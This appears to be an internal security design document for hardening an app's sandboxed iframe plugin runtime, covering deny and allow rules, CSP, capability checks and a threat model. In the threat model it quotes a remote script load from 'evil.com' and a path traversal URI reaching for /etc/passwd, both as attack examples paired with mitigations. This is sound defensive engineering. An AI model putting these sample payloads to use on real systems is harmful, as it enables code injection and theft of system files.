# Webview Hardening Guardrails — L1 Plugin Runtime

**Created:** 2026-03-01
**Status:** Active
**Scope:** L1 (sandboxed iframe) plugins only — L0 bundled plugins run in the main app tree and are first-party code.

---

## Motivation

Reverse-engineering of Nova 1.11.1 revealed an Electron runtime configured with permissive web preferences:

- Node integration enabled
- Context isolation disabled
- Sandbox disabled
- Web security disabled
- Webview tag enabled
- Response-header rewriting that weakens frame/CSP protections

Origin's plugin runtime **must never** exhibit these properties. This document codifies the allow/deny rules enforced at build time, startup, and runtime for L1 plugin embedding.

---

## Deny List — Never Allowed

These configurations are unconditionally prohibited. Runtime assertions in `src/lib/assertPluginSafety.ts` enforce these on every `IframePluginHost` mount and fail closed in development and CI.

| Rule ID | What | Why |
|---------|------|-----|
| **D1** | `sandbox` attribute must not include `allow-same-origin` | Grants the iframe the host's origin — trivially escalates to full Tauri IPC access |
| **D2** | `sandbox` attribute must not include `allow-top-navigation` | Lets the plugin navigate the host window away from the app |
| **D3** | `sandbox` attribute must not include `allow-popups-to-escape-sandbox` | Opened windows inherit no sandbox — escalation vector |
| **D4** | `sandbox` attribute must not include `allow-modals` | `alert()`/`confirm()`/`prompt()` block the main thread and can phish the user |
| **D5** | CSP must not include `unsafe-eval` in any directive | `eval()` and `new Function()` enable arbitrary code execution outside module scope |
| **D6** | CSP must not include `unsafe-inline` in `script-src` | Inline `<script>` tags bypass module-scoped execution |
| **D7** | Plugin iframes must not set `src` to any origin other than `plugin://localhost/` | Remote content is untrusted; only locally-installed plugin assets are served |
| **D8** | `postMessage` target origin must never be a specific remote origin | All host→plugin messages use `"*"` because sandboxed iframes have null origin; plugins must never receive messages addressed to a remote origin |
| **D9** | `ORIGIN_INVOKE` must reject commands not in `COMMAND_CAPABILITY_MAP` | Prevents plugins from invoking arbitrary Tauri commands |
| **D10** | `ORIGIN_INVOKE` must reject commands where the plugin's `requiredCapabilities` doesn't include the mapped capability | Principle of least privilege: plugins declare needs up front |
| **D11** | `ORIGIN_EVENT_SUBSCRIBE` must reject events not in `EVENT_CAPABILITY_MAP` | Same as D9 for event streams |

## Allow List — Explicitly Permitted

| Rule ID | What | Why |
|---------|------|-----|
| **A1** | `sandbox="allow-scripts"` (scripts only) | Plugins need JS execution but nothing else |
| **A2** | `plugin:` URI scheme in `script-src` and `frame-src` CSP | L1 plugin assets served via Rust `register_uri_scheme_protocol` |
| **A3** | `style-src 'self' 'unsafe-inline' plugin:` | Plugins need inline styles for dynamic UI (e.g. xterm.js cursor positioning) |
| **A4** | `Access-Control-Allow-Origin: *` on `plugin://` responses | Sandboxed iframes have null origin; CORS must be permissive for the custom scheme |
| **A5** | Bus relay (`ORIGIN_BUS_PUBLISH`, `ORIGIN_BUS_SUBSCRIBE`) | Inter-plugin communication is an explicit design feature |
| **A6** | Config relay (`ORIGIN_CONFIG_SET`, `ORIGIN_CONFIG_UPDATE`) | Per-instance plugin configuration |

---

## Enforcement Layers

### Layer 1 — Build-Time (tauri.conf.json)

The CSP is declared in `app.security.csp` inside `tauri.conf.json`:

```json
"security": {
  "csp": "default-src 'self' plugin:; script-src 'self' plugin:; style-src 'self' 'unsafe-inline' plugin:; frame-src plugin:"
}
```

Tauri injects this CSP into the webview at build time. Changes require a code change + rebuild.

### Layer 2 — Mount-Time Assertions (assertPluginSafety.ts)

`src/lib/assertPluginSafety.ts` exports `assertIframeSandbox()` which validates the `sandbox` attribute of every L1 plugin iframe at mount time. It:

1. Verifies `sandbox` attribute is present and non-empty
2. Rejects any token from the deny list (D1–D4)
3. Verifies only `allow-scripts` is present (A1)

In development (`import.meta.env.DEV`), violations throw immediately to fail tests and dev builds. In production, violations log a `console.error` and the iframe `src` is cleared to prevent loading.

### Layer 3 — Runtime Bridge Guards (IframePluginHost.tsx + iframeProtocol.ts)

- **Source check:** Every `message` event handler verifies `event.source === iframeRef.current?.contentWindow` before processing — messages from unknown sources are silently dropped.
- **Command allow-list:** `COMMAND_CAPABILITY_MAP` in `iframeProtocol.ts` is the complete list of Tauri commands a plugin can invoke. Unlisted commands → immediate `ORIGIN_INVOKE_ERROR`.
- **Capability check:** Even for allowed commands, the plugin's `manifest.requiredCapabilities` must include the mapped capability string. Missing capability → `ORIGIN_INVOKE_ERROR`.
- **Event allow-list:** `EVENT_CAPABILITY_MAP` restricts subscribable events. Unlisted events → silently dropped.

### Layer 4 — Filesystem Containment (Rust plugin:// handler)

`src-tauri/src/protocol/plugin.rs`:

1. Plugin IDs are validated against `[a-zA-Z0-9._-]` — no path separators or traversal sequences
2. File paths containing `..` are early-rejected before filesystem access
3. `is_within_root()` canonicalizes both the plugin root and requested path, then verifies the resolved path starts with the root — catches symlink and URL-decoding attacks

---

## Threat Model Update — Remote Content, Iframe Boundaries, Bridge Surface

### Threat: Remote content injection via plugin assets

**Vector:** A malicious plugin includes a `<script src="https://evil.com/payload.js">` tag or fetches remote code at runtime.

**Mitigations:**
- CSP `default-src 'self' plugin:` blocks loading scripts/resources from remote origins
- `sandbox="allow-scripts"` without `allow-same-origin` means the iframe has a null origin — `fetch()` to remote URLs is blocked by CORS (the response must include `Access-Control-Allow-Origin: null`, which legitimate APIs don't)
- No `connect-src` relaxation — plugins cannot phone home

**Residual risk:** A plugin could embed a `<link>` to a remote CSS file if `style-src` included remote origins, but our CSP restricts to `'self' 'unsafe-inline' plugin:` only.

### Threat: Iframe-to-host escalation

**Vector:** A sandboxed iframe attempts to access the parent window's DOM, Tauri IPC, or navigate the host.

**Mitigations:**
- `sandbox="allow-scripts"` without `allow-same-origin` — the iframe is cross-origin to the host. `parent.document`, `parent.postMessage` with origin matching, and `window.top` access all throw `SecurityError`.
- The only communication channel is `postMessage` with the typed protocol (`iframeProtocol.ts`). The host validates every message type and rejects unknown types.
- `allow-top-navigation` is absent — the iframe cannot call `top.location = ...`.
- `allow-popups-to-escape-sandbox` is absent — any popup opened by a plugin inherits the sandbox restrictions.

**Residual risk:** The host listens for `message` events globally and uses `event.source` to filter. A compromised iframe could send well-formed `PluginToHostMessage` objects, but they are constrained to the typed protocol — the worst case is publishing on the bus or invoking a command the plugin has declared capability for.

### Threat: Bridge surface — unauthorized Tauri command invocation

**Vector:** A plugin sends `ORIGIN_INVOKE` with a command not in its declared capabilities or not in the global allow-list.

**Mitigations:**
- Two-layer check: `COMMAND_CAPABILITY_MAP` (global allow-list) → `manifest.requiredCapabilities` (per-plugin declared needs)
- Commands not in the map are unconditionally rejected — the Rust `invoke_handler` is never reached
- Error responses are non-descriptive to avoid leaking internal command names

**Residual risk:** The allow-list is maintained manually in `iframeProtocol.ts`. A new Tauri command added to the handler but not the map is safe by default (denied), but a command accidentally added to the map without proper scoping could be exploited.

### Threat: Plugin filesystem escape via plugin:// URI

**Vector:** A crafted URI like `plugin://localhost/../../etc/passwd` or `plugin://localhost/com.evil/../../secrets` attempts to read files outside the plugin directory.

**Mitigations:**
- Plugin ID validation: `[a-zA-Z0-9._-]` only — no `/`, `\`, or `..`
- File path `..` early-reject before any I/O
- `is_within_root()` canonicalization as the hard guard — resolves symlinks and OS path tricks

**Residual risk:** TOCTOU between canonicalization and `fs::read` — mitigated by the plugins directory being app-owned (not user-writable at the OS level during normal operation).

---

## Verification

Automated regression tests live in `src/lib/assertPluginSafety.test.ts`. These tests verify:

1. The sandbox assertion rejects every deny-listed token
2. The sandbox assertion accepts the exact permitted configuration
3. Source-filtering in the message handler drops messages from unknown windows
4. The capability broker rejects unknown commands and missing capabilities

Run: `npm test -- assertPluginSafety`

---

## References

- `src/components/card/IframePluginHost.tsx` — L1 plugin host component
- `src/lib/iframeProtocol.ts` — typed postMessage protocol + capability maps
- `src/lib/assertPluginSafety.ts` — mount-time assertions (added by this issue)
- `src-tauri/src/protocol/plugin.rs` — Rust plugin:// URI handler
- `src-tauri/tauri.conf.json` — CSP configuration
- `docs/SPEC.md` — Plugin API contract and two-tier architecture
- `docs/research/vite-plugin-loading.md` — Plugin loading architecture
